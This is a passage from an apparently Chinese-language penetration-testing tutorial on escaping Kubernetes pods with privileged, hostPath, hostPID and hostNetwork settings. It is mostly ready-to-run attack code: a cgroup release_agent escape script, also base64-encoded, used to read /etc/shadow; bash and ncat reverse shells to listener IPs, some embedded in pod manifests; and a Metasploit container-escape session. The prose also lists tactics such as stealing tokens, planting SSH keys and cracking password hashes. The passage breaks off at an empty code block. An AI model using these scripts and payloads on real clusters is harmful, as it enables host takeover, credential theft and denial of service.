+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">d</span><span class="o">=</span><span class="sb">`</span>dirname <span class="k">$(</span>ls -x /s*/fs/c*/*/r* <span class="p">|</span>head -n1<span class="k">)</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">mkdir -p <span class="nv">$d</span>/w<span class="p">;</span><span class="nb">echo</span> <span class="m">1</span> &gt;<span class="nv">$d</span>/w/notify_on_release
+</span></span><span class="line"><span class="cl"><span class="nv">t</span><span class="o">=</span><span class="sb">`</span>sed -n <span class="s1">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">touch /o<span class="p">;</span> <span class="nb">echo</span> <span class="nv">$t</span>/c &gt;<span class="nv">$d</span>/release_agent<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="nv">$1</span><span class="s2"> &gt;</span><span class="nv">$t</span><span class="s2">/o&#34;</span> &gt;/c<span class="p">;</span>chmod +x /c<span class="p">;</span>sh -c <span class="s2">&#34;echo 0 &gt;</span><span class="nv">$d</span><span class="s2">/w/cgroup.procs&#34;</span><span class="p">;</span>sleep 1<span class="p">;</span>cat /o
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo<span class="o">=</span> <span class="p">|</span> base64 -d &gt; undock.sh 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sh undock.sh <span class="s2">&#34;cat /etc/shadow&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="4322-反弹-shell">4.3.2.2 反弹 shell</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">overlay</span><span class="o">=</span><span class="sb">`</span>sed -n <span class="s1">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">mkdir /tmp/escape
+</span></span><span class="line"><span class="cl">mount -t cgroup -o blkio cgroup /tmp/escape
+</span></span><span class="line"><span class="cl">mkdir -p /tmp/escape/w
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /tmp/escape/w/notify_on_release
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$overlay</span><span class="s2">/shell.sh&#34;</span> &gt; /tmp/escape/release_agent
+</span></span><span class="line"><span class="cl">sleep <span class="m">3</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="m">0</span> &gt;/tmp/escape/w/cgroup.procs <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">nc -l -p <span class="m">4444</span> escape.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建 <code>shell.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/POD_IP/4444 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x shell.sh escape.sh <span class="o">&amp;&amp;</span> ./escape.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="4323-metasploit">4.3.2.3 metasploit</h5>
+<p>pods 中反弹shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@pod-priv:/# /bin/sh -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.33.114/4444 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>msf 中设置监听器与配置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 192.168.33.114
+</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 192.168.33.114
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.33.114:4444
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>192.168.33.114:4444 -&gt; 192.168.33.133:64341<span class="o">)</span> at 2023-11-21 16:36:29 +0800
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Shell Banner:
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">-----
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># background</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Background session 1? <span class="o">[</span>y/N<span class="o">]</span>  y
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/linux/local/docker_privileged_container_escape
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to linux/armle/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>linux/local/docker_privileged_container_escape<span class="o">)</span> &gt; <span class="nb">set</span> payload linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>linux/local/docker_privileged_container_escape<span class="o">)</span> &gt; <span class="nb">set</span> session <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">session</span> <span class="o">=</span>&gt; <span class="m">1</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>linux/local/docker_privileged_container_escape<span class="o">)</span> &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527478.png-water_print" /></p>
+<h3 id="44-开放-hostpath-权限">4.4 开放 HostPath 权限</h3>
+<p>在这种场景下，即使没有访问主机进程或网络命名空间的权限，如果集群管理员没有限制 pod 可以挂载的内容，可以将宿主机的文件系统挂载到攻击者创建的 pod 中，从而获得宿主机文件系统的读/写权限。</p>
+<p>下面是一些常见的提权手法：</p>
+<ul>
+<li>寻找 kubeconfig 文件 - 通过查看宿主机中的 kubeconfig 文件，有可能获取集群管理员的 token 权限。</li>
+<li>获取宿主机节点上 pod 的令牌 - 可以使用 <code>kubectl auth can-i --list</code> 查看其它的 pod 的令牌比当前权限更高。</li>
+<li>添加 SSH 密钥 - 将本地的公钥添加到宿主机节点，SSH 登录，获取 shell。</li>
+<li>破解 hash 密码 - 破解 <code>/etc/shadow</code> 中的 hash 密码。</li>
+</ul>
+<h4 id="441-获取-shell">4.4.1 获取 shell</h4>
+<p>创建 pod 挂载宿主机文件系统：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostpath-exec-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostpath-exec-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostpath-revshell-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostpath-revshell-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.138 4444 -e /bin/bash;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="442-后渗透">4.4.2 后渗透</h4>
+<p>关于后渗透的部分可以参考前面的场景，在此不做赘述。</p>
+<h3 id="45-开放-hostpid-权限">4.5 开放 HostPid 权限</h3>
+<p>在只有 hostPID 权限的节点上目前没有较好的 getshell 的方法，但是可以从以下几个方面思考：</p>
+<ul>
+<li>查看宿主机上的进程 - 在拥有 hostPID 权限的 pod 中运行 <code>ps</code> 时，可以看到宿主机上运行的所有进程，包括每个 pod 中运行的进程。</li>
+<li>查找密码、令牌、密钥等 - 通过搜索进程命令行、本地文件系统中的密钥或token 进行横向移动。</li>
+<li>拒绝服务攻击 - 可以 kill 当前节点上的任何进程，实现拒绝服务的效果。</li>
+</ul>
+<h3 id="46-开放-hostnetwork-权限">4.6 开放 HostNetwork 权限</h3>
+<p>如果只有 hostNetwork 权限，有三种可能的提权路径：</p>
+<ul>
+<li>访问绑定到宿主机 localhost 的服务 - 可以访问只监听主机环回接口或被网络策略阻止的服务。比如：api server 的 8080 端口提供的是没有 TLS 加密的 HTTP 服务，且所有到达该端口的请求将绕过所有认证和授权模块，如果可以访问该接口，就可以接管集群。</li>
+<li>嗅探流量 - 可以使用 tcpdump 在主机的网络接口上嗅探未加密的流量。通过流量监控可以发现未加密通道传输的服务帐户令牌或其它敏感信息。</li>
+<li>绕过网络策略 - 如果命名空间应用了限制性网络策略，那么部署带有 hostNetwork 权限的 pod 就可以绕过这些限制。</li>
+</ul>
+<h4 id="461-获取-shell">4.6.1 获取 shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostnetwork-only</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostnetwork-only</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostnetwork-only-reverse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostnetwork-only-reverse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.138 4444 -e /bin/bash;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="462-后渗透">4.6.2 后渗透</h4>
+<h5 id="4621-环境准备">4.6.2.1 环境准备</h5>
+<p>以访问 api-server 的 8080 端口为例，在默认情况下，需要修改 api-server 的配置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="l">vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>手动添加如下两行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">- --insecure-port=8080
+</span></span><span class="line"><span class="cl">- --insecure-bind-address=127.0.0.1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291527176.png-water_print" /></p>
+<p>然后重启 api-server 即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systemctl restart kubelet
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="4622-接管集群">4.6.2.2 接管集群</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
